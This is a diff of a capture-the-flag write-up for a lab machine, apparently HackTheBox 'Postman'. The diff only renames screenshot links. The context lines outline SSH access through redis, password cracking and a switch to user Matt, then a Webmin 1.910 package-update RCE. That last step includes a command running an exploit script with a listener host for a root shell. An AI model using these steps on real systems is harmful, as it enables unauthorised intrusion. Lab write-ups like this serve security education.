@@ -51,7 +51,7 @@ ssh -i id_rsa redis@10.129.2.1
 
 This would generate a pair of keys, and afterwards write it into the machine as the keys for `redis`. Then we can directly SSH in.
 
-![](<../../../.gitbook/assets/image%20(2621).png>)
+![](../../../.gitbook/assets/postman-2.png)
 
 ## Privilege Escalation
 
@@ -96,7 +96,7 @@ Session completed.
 
 Great! We now have a password for the user. We can use `su` to change from `redis` to `Matt`.
 
-![](<../../../.gitbook/assets/image%20(3221).png>)
+![](../../../.gitbook/assets/postman-3.png)
 
 We can then grab the user flag.
 
@@ -104,9 +104,9 @@ We can then grab the user flag.
 
 In the earlier `nmap` scan, we found that there were some HTTP ports that I didn't touch till now. Port 10000 has a Webmin instance running, and we can login using the credentials we just found.
 
-![](<../../../.gitbook/assets/image%20(470).png>)
+![](../../../.gitbook/assets/postman-5.png)
 
-![](<../../../.gitbook/assets/image%20(3718).png>)
+![](../../../.gitbook/assets/postman-4.png)
 
 This was running Webmin 1.910, which is vulnerable to RCE through Package Updates. There are tons of PoCs online.
 
@@ -118,4 +118,4 @@ $ python3 rce.py --ip_address 10.129.2.1 --port 10000 --lhost 10.10.14.13 --lpor
 
 This would give us an easy `root` shell.
 
-![](<../../../.gitbook/assets/image%20(2483).png>)
+![](../../../.gitbook/assets/postman-1.png)
